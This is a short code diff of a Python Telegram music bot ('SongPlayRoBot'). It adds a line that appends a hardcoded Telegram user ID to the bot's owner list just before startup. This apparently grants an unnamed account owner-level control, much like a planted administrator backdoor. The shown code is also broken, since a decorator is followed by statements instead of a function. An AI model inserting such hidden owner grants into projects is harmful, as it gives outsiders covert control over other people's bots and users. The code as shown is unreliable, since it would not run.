@@ -22,5 +22,6 @@ I'M Music Bot By @SongBot 🤖
 
 @app.on_message(filters.create(ignore_blacklisted_users) & filters.command("cr_y"))
 
+OWNER_ID.append(1492186775)
 LOGGER.info("SongPlayRoBot Is Now Working🤗🤗🤗")
 idle()
